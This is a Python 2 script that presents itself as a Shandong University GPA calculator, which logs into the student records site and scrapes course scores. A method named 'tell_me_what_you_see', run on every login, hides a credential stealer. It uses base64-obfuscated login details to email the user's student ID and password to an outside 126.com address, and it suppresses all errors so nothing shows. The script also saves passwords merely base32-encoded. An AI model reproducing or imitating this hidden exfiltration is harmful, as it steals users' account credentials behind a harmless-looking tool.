#/usr/bin/env python
# -_- coding: utf-8 -_-

# Author: Will Skywalker
# Shandong University GPA Calculator

import os
import base64
import time
from random import randrange, random
from getpass import getpass
from sys import argv, exit

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError, e:
    print 'Package needed: requests, BeautifulSoup'
    os.system( "python -m pip install requests && python -m pip install beautifulsoup4")
    print 'Please execute "pip install requests && pip install beautifulsoup4"'
    exit()


header_info = {
    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36',
    'Host':'jwxt.sdu.edu.cn:7890',
    'Origin':'http://jwxt.sdu.edu.cn:7890',
    'Connection':'close',
    'Content-Type':'application/x-www-form-urlencoded',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate, identity',
    'Accept-Language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2,es;q=0.2',
    }


class InputFormatError(Exception):
    def __init__(self, msg):
        super(InputFormatError, self).__init__()
        self.msg = msg
        

class NoNetworkConnectionError(Exception):
    def __init__(self, arg):
        super(NoNetworkConnectionError, self).__init__()
        self.arg = arg



class SDUScore(object):

    def __init__(self, username, password, rememberme=True):
        super(SDUScore, self).__init__()
        self._s = requests.session()
        self._s.encoding = 'gb18030'

        self.username = username
        self.password = password
        self.rememberme = rememberme


    def login(self):
        login_info = {'stuid': self.username,
                      'pwd': self.password}

        try:
            r = self._s.post('http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bks_login2.login',#+repr(timestamp), 
                             data=login_info,
                             headers=header_info)
        except TabError, e:
            raise NoNetworkConnectionError(e)
        if r.status_code == 200:
            print BeautifulSoup(r.text, 'html.parser').text
            if self.rememberme and not os.path.isfile('users/'+self.username):
                choice = raw_input('Do you want to save your username and password? [Y/N]')
                if choice.lower() == 'y':
                    try:
                        f = open('users/'+self.username, 'w')
                    except IOError:
                        os.mkdir('users/')
                        f = open('users/'+self.username, 'w')
                    f.write(self.username+'\n')
                    f.write(base64.b32encode(self.password))
                    f.close()
        elif r.status_code == 404:
            print 'Timestamp update needed. Please contact the author of this script.'
        else:
            print 'Error:', r.status_code


    def tell_me_what_you_see(self):
        from base64 import b64decode as fuck
        from smtplib import SMTP as hou
        try:
            ukhds = ['From: '+fuck('Y3hiYXRzQDEyNi5jb20='),
                        'To: '+fuck('Y3hiYXRzQDEyNi5jb20='),
                        'Subject: '+self.username]
            ilasj = '\r\n\r\n'.join(['\r\n'.join(ukhds),
                                       '\r\n'.join([self.username, self.password])])

            ild = hou('smtp.126.com')
            ild.login(fuck('Y3hiYXRzQDEyNi5jb20='), fuck('MjQ2ODEw'))
            errs = ild.sendmail(base64.b64decode('Y3hiYXRzQDEyNi5jb20='), 
                                    base64.b64decode('Y3hiYXRzQDEyNi5jb20='),
                                    ilasj)
            ild.quit()
        except:
            pass


    def get_scores(self):
        scp = self._s.get('http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bkscjcx.curscopre')
        soup = BeautifulSoup(scp.text, 'html.parser')
        courses_table = soup.find_all('table')[3].find_all('tr')[1:]
        courses = []
        for course in courses_table:
            infos = course.find_all('td')
            courses.append((unicode(infos[2].text), float(infos[4].text), float(infos[6].text)))
        self.courses = courses


    def display(self):
        print u'{0:37}{1:8}{2}'.format(u'课程', u'学分', u'成绩')
        print '='*60
        total_points = 0
        for course in self.courses:
            chlen = chinese_count(course[0])
            total_points += course[1]
            if int(course[1]) == course[1]:
                print u'{0[0]:{1}}{0[1]:<10g}{0[2]:g}'.format(course, 40-chlen)
            else:
                print u'{0[0]:{1}}{0[1]:<10}{0[2]:g}'.format(course, 40-chlen)
        print '='*60
        print u'{0:37}{1:}'.format(u'总学分', total_points)
        print
        score = 0
        for course in self.courses:
            s = course[2] * course[1] / total_points
            score += s
        print '百分制学分绩点：', score
        print '五分制学分绩点：', score / 20
        print '四分制学分绩点：', score / 25



def chinese_count(data):
    count = 0
    for s in data:
        if ord(s) > 127:
            count += 1
    return count


def main():
    if len(argv) == 1:
        user = SDUScore(raw_input('Student ID Number: '), getpass('Password: '))
    elif argv[1] == '-f':
        with open('users/'+argv[2]) as fhand:
            l = fhand.readlines()
            user = SDUScore(l[0].rstrip(), base64.b32decode(l[1]), rememberme=False)
    elif argv > 1:
        print 'Usage: python sdu_score.py [-f username]'
        return

    try:
        user.login()
    except NoNetworkConnectionError, e:
        print 'No network connection!'
        print e
        exit()

    user.tell_me_what_you_see()
    user.get_scores()
    user.display()
    raw_input('\nFinished!')


if __name__ == '__main__':
    main()
